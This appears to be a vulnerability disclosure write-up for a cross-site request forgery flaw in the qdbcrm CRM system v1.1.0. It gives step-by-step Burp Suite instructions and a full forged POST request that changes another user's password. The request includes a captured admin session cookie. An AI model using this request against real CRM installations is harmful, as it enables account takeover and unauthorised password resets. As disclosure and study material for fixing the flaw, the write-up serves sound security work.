企点邦CRM客户管理系统 v1.1.0（qdbcrm）


Manufacturer's official website：https://www.100926.com/#free_down


Download address：https://down.chinaz.com/soft/51457.htm


进入后台之后选择员工管理-编辑信息

After entering the backend, select Employee Management - Edit Information

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/496babc4-aa3d-4157-96b9-8bef4f76f33d)

输入重置的密码，点击提交保存

Enter the reset password and click submit to save

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/2f47ef12-dea5-4c5a-96f5-a9436eae8ae6)

使用burp抓取修改密码的数据包

Using Burp to Grab Data Packets for Changing Passwords


![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/ab7848ae-9f74-4925-80e5-2b0648d521d9)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/086c28cf-17ae-4186-a77b-66909a75b62e)

通过id，修改用户的个人信息（包括密码）

Modify the user's personal information (including password) through ID


使用burp中的CSRF插件

Using the CSRF plugin in burp

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/0ea36371-db92-4246-96df-5c4cca1e542a)


![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/9a3979c3-ae14-448f-b749-3adb2e4673f4)


点击按钮

Click on the button

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/3307a7b6-28db-4437-b583-b27468ba3b40)


![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/4f3f6780-93dc-4315-a3c9-2398f3401341)



Request:

```
POST /index.php/user/edit?id=2 HTTP/1.1
Host: qdbcrm
Content-Length: 200
Pragma: no-cache
Cache-Control: no-cache
Origin: http://burp
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://burp/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5
Cookie: qdbcrm_session=a%3A11%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22c7c6a13c61a793f6c1d243aba0b18690%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F120.0.0.0+Safari%2F537.36+Edg%2F120.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1705215195%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A3%3A%22uid%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22realname%22%3Bs%3A15%3A%22%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%22%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A7%3A%22groupid%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22roleid%22%3Bs%3A1%3A%220%22%3Bs%3A6%3A%22sionid%22%3Bs%3A16%3A%227d21233cf508a5d6%22%3B%7D322f66569e5e340364a6286bd459de2b16b91050
Connection: close

realname=csrf&userpwd=Test123&confirmpwd=Test123&groupid=1&iszhuguan=%EF%BF%BD%C2%90%C2%A6&roleid=1&maxnum=0&maxnum_paichu_cj=%EF%BF%BD%C2%90%C2%A6&mobile=&email=&content_user=csrf&desk_grzl=1&state=1
```

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/335cf244-2b34-4f07-908d-c65697014316)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/f5aa4d4b-5263-4a3e-a007-aa9741468fe5)



